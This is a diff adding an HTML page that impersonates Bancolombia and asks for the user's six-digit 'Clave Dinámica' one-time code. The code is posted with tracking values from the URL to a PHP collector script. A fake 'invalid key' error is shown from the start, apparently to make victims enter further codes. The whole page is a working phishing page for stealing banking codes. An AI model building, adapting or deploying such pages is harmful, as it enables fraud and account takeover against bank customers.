@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Clave Dinámica</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+    
+      background-color: #fbfbfb;;
+    }
+
+    h2 {
+      color: #333;
+    }
+
+    .input-wrapper {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin: 30px 0;
+    }
+
+    .digit-box {
+      width: 30px;
+      height: 40px;
+      border-bottom: 3px solid red;
+      font-size: 24px;
+      text-align: center;
+      line-height: 40px;
+    }
+
+    #clave {
+      position: absolute;
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    .botones {
+      margin-top: 30px;
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+    }
+
+    button {
+      padding: 10px 20px;
+      border-radius: 25px;
+      border: 2px solid #ccc;
+      background-color: #e5e5e5;
+      color: #666;
+      font-size: 16px;
+      cursor: not-allowed;
+    }
+
+    button.activo {
+      background-color: #fdda24 ;
+      color: #000000;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <center>
+  <img src="img/logo-removebg-preview.png" width="60%" alt="">
+  </center>
+  <div style="background-color: #fff; padding: 2%; border-radius: 10px;">
+ 
+ <br><br><br>   <center><img src="img/dinamic.gif" width="100%" alt=""></center>
+  <h2>Ingresa la Clave Dinámica</h2>
+  <p>Encuentra tu Clave Dinámica en la app Mi Bancolombia.</p>
+
+<form action="enviar_dato_extra.php" method="post">
+  <!-- Campo oculto para el código dinámico -->
+  <input type="text" id="clave" name="codigo" maxlength="6" inputmode="numeric" autofocus />
+
+  <!-- Campo oculto para el rid -->
+  <input type="hidden" name="key" id="key">
+
+
+    <input type="hidden" name="requestId" id="requestId">
+
+
+  
+  
+  <!-- Display de dígitos -->
+  <div class="input-wrapper" onclick="document.getElementById('clave').focus()">
+    <div class="digit-box" id="d0"></div>
+    <div class="digit-box" id="d1"></div>
+    <div class="digit-box" id="d2"></div>
+    <div class="digit-box" id="d3"></div>
+    <div class="digit-box" id="d4"></div>
+    <div class="digit-box" id="d5"></div>
+  </div>
+   <!-- Mensaje de error -->
+    <div style="background-color:white; padding: 15px 20px; border-radius: 10px; color: #2f2f2f; text-align: left; box-shadow: 0 4px 8px rgba(0,0,0,0.4);">
+      <div style="display: flex; align-items: center;">
+        <div style=" background-color: rgb(177, 80, 35);    padding: 1%;   width: 60px; border-radius: 100px;   color: rgb(16, 15, 15); font-size: 30px; margin-right: 10px; height: 37px;"><center>✖</center> </div>
+        <div>
+          <strong style="display: block; color:#2f2f2f;">Clave inválida, inténtalo de nuevo.</strong>
+          <small style="color:#2f2f2f;">Pronto solucionaremos el problema y podrás continuar con tu solicitud.</small>
+        </div>
+      </div>
+    </div>
+  <div class="botones">
+    <button style="width: 30%;" type="button" onclick="borrar()">Borrar</button>
+    <button type="submit" id="continuar" disabled>Continuar</button>
+  </div>
+</form>
+  <script>
+    const claveInput = document.getElementById("clave");
+    const continuarBtn = document.getElementById("continuar");
+
+    claveInput.addEventListener("input", () => {
+      const val = claveInput.value.replace(/\D/g, "").slice(0, 6);
+      claveInput.value = val;
+
+      for (let i = 0; i < 6; i++) {
+        const box = document.getElementById(`d${i}`);
+        box.textContent = val[i] || "";
+      }
+
+      if (val.length === 6) {
+        continuarBtn.disabled = false;
+        continuarBtn.classList.add("activo");
+      } else {
+        continuarBtn.disabled = true;
+        continuarBtn.classList.remove("activo");
+      }
+    });
+
+    function borrar() {
+      claveInput.value = "";
+      claveInput.dispatchEvent(new Event("input"));
+      claveInput.focus();
+    }
+  </script>
+  <br><br>
+  </div>
+  <center>
+  <img src="img/footer2.png" width="100%" alt="">
+  </center>
+  <script>
+  // Obtener el parámetro rid de la URL
+  const params = new URLSearchParams(window.location.search);
+  const key = params.get("key");
+
+  // Asignarlo al campo oculto
+  if (key) {
+    document.getElementById("key").value = key;
+  }
+ const requestId = params.get("requestId");
+
+  // Asignarlo al campo oculto
+  if (requestId) {
+    document.getElementById("requestId").value = requestId;
+  }
+
+  
+</script>
+
+
+<script>
+  function cerrarModal() {
+    document.getElementById("modal").style.display = "none";
+  }
+
+  // Opcional: auto cerrar después de unos segundos
+  // setTimeout(cerrarModal, 8000);
+</script>
+</body>
+</html>
